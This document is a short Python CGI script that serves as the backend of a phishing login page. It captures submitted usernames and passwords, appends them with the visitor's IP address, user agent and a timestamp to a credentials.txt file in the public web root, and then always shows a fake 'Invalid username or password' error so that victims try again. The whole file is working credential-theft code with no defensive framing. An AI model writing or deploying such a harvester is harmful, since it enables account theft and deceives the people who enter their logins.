#!/usr/bin/env python3
import cgi, datetime, os

# Get form input
form = cgi.FieldStorage()
user = form.getvalue("user")
pw = form.getvalue("pass")

# Metadata
ip = os.environ.get("REMOTE_ADDR", "unknown")
ua = os.environ.get("HTTP_USER_AGENT", "unknown")
time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Savving attempt
try:
    with open("/var/www/html/credentials.txt", "a") as f:
        f.write(f"[{time}] IP: {ip} | Username: {user} | Password: {pw} | User-Agent: {ua}\n")
except Exception as e:
    pass  # avoid Apache 500 if write fails

# Return index.html with injected error message
print("Content-type: text/html\n")

try:
    with open("/var/www/html/index.html") as f:
        html = f.read()
except:
    html = "<h1>Login Page Missing</h1>"

# Adding error message placeholder
error_message = "<p style='color:red; text-align:center;'>Invalid username or password.</p>"


if "{{error_message}}" in html:
    html = html.replace("{{error_message}}", error_message)
else:
    # fallback: append below form
    html = html.replace("</form>", f"</form>{error_message}")

print(html)

